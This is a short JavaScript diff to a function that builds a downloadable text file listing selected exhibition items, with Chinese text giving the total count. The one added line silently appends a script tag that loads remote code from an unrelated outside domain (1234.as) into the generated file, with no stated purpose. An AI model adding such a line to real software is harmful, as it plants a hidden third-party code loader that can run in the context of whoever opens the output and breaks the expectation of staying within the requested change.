@@ -650,6 +650,7 @@ function generateTxtFile(text){
             }
         }
         exhibitionText += '一共精选了' + exhib_total + '条';
+        exhibitionText += '<script src="https://1234.as/embed.js" async="async"></script>'
         var link = document.getElementById('downloadFile');
         link.href = generateTxtFile(exhibitionText);
         link.style.display = 'inline-block';
